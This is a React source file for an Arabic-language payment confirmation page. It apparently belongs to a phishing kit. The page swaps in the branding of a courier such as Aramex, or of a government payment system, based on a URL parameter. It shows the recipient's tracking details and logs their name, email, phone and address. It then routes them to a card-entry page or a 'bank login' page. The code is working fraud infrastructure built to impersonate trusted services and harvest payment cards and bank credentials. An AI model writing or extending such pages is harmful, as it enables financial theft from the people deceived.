import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink, useCreatePayment } from "@/hooks/useSupabase";
import {
  Package,
  CreditCard,
  Building2,
  ShieldCheck,
  ArrowLeft,
  Loader2,
  Landmark,
  Info,
  CheckCircle2
} from "lucide-react";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { applyDynamicIdentity, removeDynamicIdentity } from "@/lib/dynamicIdentity";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";

const PaymentDetails = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { data: link, isLoading } = useLink(id);
  const createPayment = useCreatePayment();

  const company = searchParams.get("company") || link?.payload?.service_key || "aramex";
  const method = searchParams.get("method") || link?.payload?.payment_method || "card";
  const branding = getServiceBranding(company);
  const countryCode = link?.country_code || "SA";
  const govSystem = getGovernmentPaymentSystem(countryCode);

  useEffect(() => {
    if (company) {
      applyDynamicIdentity(company);
    }
    return () => {
      removeDynamicIdentity();
    };
  }, [company]);

  const handleProceed = async () => {
    if (!link) return;
    try {
      const amount = link.payload.payment_amount || link.payload.cod_amount || link.payload.total_amount || 0;
      const payment = await createPayment.mutateAsync({
        link_id: id!,
        amount: amount,
        currency: link.payload.currency_code || countryCode,
        status: "pending",
        name: link.payload.customerInfo?.fullName || link.payload.customer_name,
        email: link.payload.customerInfo?.email || link.payload.customer_email,
        phone: link.payload.customerInfo?.phone || link.payload.customer_phone,
        address: link.payload.customerInfo?.address
      });

      if (method === 'bank_login') {
        navigate(`/pay/${id}/bank-selector?company=${company}&paymentId=${payment.id}`);
      } else {
        navigate(`/pay/${id}/card-input?company=${company}&paymentId=${payment.id}`);
      }
    } catch (err) {
      console.error(err);
    }
  };

  if (isLoading || !link) {
    return <div className="min-h-screen flex items-center justify-center bg-gray-50"><Loader2 className="w-12 h-12 animate-spin text-blue-600" /></div>;
  }

  const isGov = company.startsWith('gov_');
  const primaryColor = isGov ? govSystem.colors.primary : branding.colors.primary;
  const amount = link.payload.payment_amount || link.payload.cod_amount || link.payload.total_amount || 0;
  const currency = link.payload.currency_code || countryCode;

  return (
    <div className="min-h-screen bg-[#F8FAFC] pb-24" dir="rtl">
      <header className="bg-white border-b-4 shadow-sm sticky top-0 z-50" style={{ borderBottomColor: primaryColor }}>
        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
             <BackButton />
             <div>
                <h1 className="text-xl font-black text-gray-800">مراجعة وتأكيد الدفع</h1>
                <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Payment Confirmation</p>
             </div>
          </div>
          {isGov ? (
            govSystem.logo && <img src={govSystem.logo} className="h-8 w-auto object-contain" alt="" />
          ) : (
            branding.logo && <img src={branding.logo} className="h-8 w-auto object-contain" alt="" />
          )}
        </div>
      </header>

      <div className="container mx-auto px-4 py-10">
        <div className="max-w-4xl mx-auto grid md:grid-cols-5 gap-10">
          <div className="md:col-span-3 space-y-8">
            <Card className="overflow-hidden border-0 shadow-2xl rounded-[2.5rem] bg-white">
               <div className="p-8 border-b-2 border-dashed border-gray-100 flex items-center gap-6">
                  <div className="w-20 h-20 rounded-3xl bg-gray-50 flex items-center justify-center border-2 border-gray-100 shadow-sm" style={{ color: primaryColor }}>
                     {isGov ? <Landmark className="w-10 h-10" /> : <Package className="w-10 h-10" />}
                  </div>
                  <div>
                     <Badge className="mb-2 border-0 font-black px-3 py-1 text-[10px] uppercase" style={{ backgroundColor: `${primaryColor}10`, color: primaryColor }}>Service Summary</Badge>
                     <h2 className="text-2xl font-black text-gray-800">{link.payload.service_name || link.payload.chalet_name}</h2>
                  </div>
               </div>

               <div className="p-8 grid grid-cols-2 gap-8">
                  {link.payload.tracking_number && (
                    <div><p className="text-[10px] font-black text-gray-400 uppercase mb-1">رقم الشحنة</p><p className="font-black text-gray-700 font-mono text-lg">{link.payload.tracking_number}</p></div>
                  )}
                  {link.payload.reference && (
                    <div><p className="text-[10px] font-black text-gray-400 uppercase mb-1">الرقم المرجعي</p><p className="font-black text-gray-700 font-mono text-lg">{link.payload.reference}</p></div>
                  )}
                  <div className="col-span-2"><p className="text-[10px] font-black text-gray-400 uppercase mb-1">المستفيد</p><p className="font-black text-gray-700">{link.payload.customerInfo?.fullName || link.payload.customer_name}</p></div>
               </div>
            </Card>

            <Card className="p-8 border-0 shadow-xl rounded-[2.5rem] bg-white space-y-6">
               <h3 className="text-lg font-black text-gray-800 flex items-center gap-3"><div className="w-1.5 h-5 rounded-full" style={{ background: primaryColor }} /> طريقة الدفع المحددة</h3>
               <div className="p-6 rounded-3xl border-2 flex items-center gap-4 shadow-lg shadow-blue-900/5" style={{ borderColor: primaryColor, backgroundColor: `${primaryColor}05` }}>
                  <div className="w-14 h-14 rounded-2xl text-white flex items-center justify-center shadow-xl" style={{ background: primaryColor }}>
                     {method === 'bank_login' ? <Building2 className="w-7 h-7" /> : <CreditCard className="w-7 h-7" />}
                  </div>
                  <div className="flex-1">
                     <p className="font-black text-gray-800 text-lg">{method === 'bank_login' ? 'تسجيل دخول البنك' : 'البطاقة الائتمانية'}</p>
                     <p className="text-xs font-bold text-gray-400">{method === 'bank_login' ? 'تحويل بنكي مباشر آمن' : 'Visa • Mastercard • Mada'}</p>
                  </div>
                  <CheckCircle2 className="w-8 h-8" style={{ color: primaryColor }} />
               </div>
            </Card>
          </div>

          <div className="md:col-span-2 space-y-8">
             <Card className="p-8 border-0 shadow-2xl rounded-[3rem] text-white relative overflow-hidden" style={{ background: isGov ? govSystem.gradients.primary : (branding.gradients.primary || branding.colors.primary) }}>
                <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 -mr-16 -mt-16 rounded-full" />
                <h3 className="text-sm font-black opacity-40 uppercase tracking-widest mb-10">Invoice Total</h3>
                <div className="space-y-6">
                   <div className="flex justify-between items-center text-sm font-bold opacity-60"><span>قيمة الخدمة</span><span>{formatCurrency(amount, currency)}</span></div>
                   <div className="pt-6 border-t border-white/10">
                      <p className="text-[10px] font-black opacity-40 uppercase mb-2">الإجمالي المستحق</p>
                      <p className="text-5xl font-black tracking-tighter">{formatCurrency(amount, currency)}</p>
                   </div>
                </div>
                <Button onClick={handleProceed} className="w-full h-20 mt-10 bg-white hover:bg-gray-100 rounded-[1.5rem] text-2xl font-black shadow-2xl transition-all hover:scale-[1.02] active:scale-[0.98]" style={{ color: primaryColor }}>
                  سداد الآن <ArrowLeft className="mr-3 w-8 h-8" />
                </Button>
             </Card>
          </div>
        </div>
      </div>
      <BottomNav />
    </div>
  );
};

export default PaymentDetails;
